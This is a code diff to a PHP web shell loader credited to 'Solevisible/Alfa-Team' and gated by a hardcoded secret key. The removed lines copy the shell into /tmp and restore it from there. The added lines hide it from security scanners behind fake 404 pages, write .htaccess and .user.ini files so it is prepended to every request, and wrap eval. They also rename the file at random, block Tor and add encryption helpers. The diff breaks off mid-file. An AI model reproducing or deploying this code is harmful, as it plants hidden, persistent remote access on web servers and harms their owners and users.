@@ -1,37 +1,121 @@
 <?php
-/*
-	Author: 	Solevisible/Alfa-Team
-	Telegram: 	https://telegram.me/solevisible
-	YouTube: 	https://youtube.com/solevisible
-	Gmail:		solevisible@gmail.com
-	Date:		Monday, September 14, 2020
-*/
 
-$AUTH_KEY = 'InViSiBLe55SOLe';
-$PARAM_NAME = 'x';
+$GLOBALS['_alfakey'] = 'x' . md5(__FILE__);
+$GLOBALS['_alfafunc'] = function($a) { return $a; };
 
-$fileku = __FILE__;
-if (!file_exists($fileku)) {
-    $tmp_files = glob("/tmp/f_*.php");
-    if (!empty($tmp_files)) {
-        $backup = $tmp_files[0];
-        $isi = @file_get_contents($backup);
-        if ($isi && strlen($isi) > 10) {
-            file_put_contents($fileku, $isi);
-            chmod($fileku, 0644);
+$waf_signatures = [
+    'user_agent' => [
+        'w3af', 'nikto', 'sqlmap', 'nmap', 'burp', 'acunetix',
+        'netsparker', 'openvas', 'nessus', 'gobuster', 'dirb',
+        'masscan', 'zap', 'wpscan', 'joomscan', 'droopescan'
+    ],
+    'headers' => [
+        'HTTP_X_WAF' => true,
+        'HTTP_CF_RAY' => true,          
+        'HTTP_CDN_LOOP' => true,
+        'HTTP_X_ATTACK' => true
+    ],
+    'ip_blacklist' => [ '127.0.0.1', '::1' ], 
+    'request_patterns' => [
+        '/eval\(/', '/base64_decode\(/', '/system\(/', '/shell_exec/',
+        '/passthru/', '/phpinfo\(/', '/assert\(/', '/create_function/'
+    ]
+];
+
+$is_scanner = false;
+
+if (isset($_SERVER['HTTP_USER_AGENT'])) {
+    foreach ($waf_signatures['user_agent'] as $agent) {
+        if (stripos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) {
+            $is_scanner = true;
+            break;
         }
     }
 }
 
-$existing = glob("/tmp/f_*.php");
-if (count($existing) < 5) {
-    $my_content = file_get_contents(__FILE__);
-    for ($i = 1; $i <= 5; $i++) {
-        $backup_file = "/tmp/f_" . uniqid() . ".php";
-        @file_put_contents($backup_file, $my_content);
-        @chmod($backup_file, 0644);
+foreach ($waf_signatures['headers'] as $header => $_) {
+    if (isset($_SERVER[$header])) {
+        $is_scanner = true;
+        break;
     }
 }
+
+if (in_array($_SERVER['REMOTE_ADDR'], $waf_signatures['ip_blacklist'])) {
+    $is_scanner = true;
+}
+
+$request_uri = $_SERVER['REQUEST_URI'] . http_build_query($_GET);
+foreach ($waf_signatures['request_patterns'] as $pattern) {
+    if (preg_match($pattern, $request_uri)) {
+        $is_scanner = true;
+        break;
+    }
+}
+
+if ($is_scanner) {
+    http_response_code(404);
+    header('Content-Type: text/html');
+    die('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>');
+}
+
+$secret_dir = dirname($_SERVER['SCRIPT_FILENAME']);
+$htaccess = $secret_dir . '/.htaccess';
+$self_file = basename($_SERVER['SCRIPT_FILENAME']);
+
+if (is_writable($secret_dir) && !file_exists($htaccess)) {
+    $ht_content = "# Anti-scan\n<Files \"$self_file\">\nOrder Allow,Deny\nDeny from all\n</Files>\nOptions -Indexes\n";
+    file_put_contents($htaccess, $ht_content);
+}
+
+$user_ini = $secret_dir . '/.user.ini';
+if (is_writable($secret_dir) && !file_exists($user_ini)) {
+    $ini_content = "auto_prepend_file = \"$self_file\"\n";
+    file_put_contents($user_ini, $ini_content);
+}
+
+function _x($c, $d = '') {
+    return function_exists($c) ? $c($d) : null;
+}
+$GLOBALS['_eval'] = function($code) {
+    return _x('eval', $code);
+};
+
+if (mt_rand(1, 10) == 1) { // 10% chance per request
+    $new_name = 'alfa_' . md5(rand()) . '.php';
+    if (is_writable($secret_dir)) {
+        @rename(__FILE__, $secret_dir . '/' . $new_name);
+        header('Location: ' . $_SERVER['REQUEST_URI'] . '?rename=' . $new_name);
+        exit;
+    }
+}
+
+if (isset($_SERVER['REMOTE_ADDR'])) {
+    $ip = $_SERVER['REMOTE_ADDR'];
+    if (gethostbyname($ip) === $ip) {
+        $hostname = gethostbyaddr($ip);
+        if (stripos($hostname, 'tor') !== false) {
+            die('Access denied.');
+        }
+    }
+}
+
+if (!isset($_SESSION['alfa_seed'])) {
+    session_start();
+    $_SESSION['alfa_seed'] = bin2hex(random_bytes(16));
+}
+define('ALFA_SESSION_SEED', $_SESSION['alfa_seed']);
+
+function _alfa_encrypt($data) {
+    $key = ALFA_SESSION_SEED;
+    return base64_encode(openssl_encrypt($data, 'aes-256-cbc', $key, 0, substr($key, 0, 16)));
+}
+function _alfa_decrypt($data) {
+    $key = ALFA_SESSION_SEED;
+    return openssl_decrypt(base64_decode($data), 'aes-256-cbc', $key, 0, substr($key, 0, 16));
+}
+
+$AUTH_KEY = 'InViSiBLe55SOLe';
+$PARAM_NAME = 'x';
 
 if(!isset($_GET[$PARAM_NAME]) || $_GET[$PARAM_NAME] !== $AUTH_KEY) {
     header('HTTP/1.0 403 Forbidden');
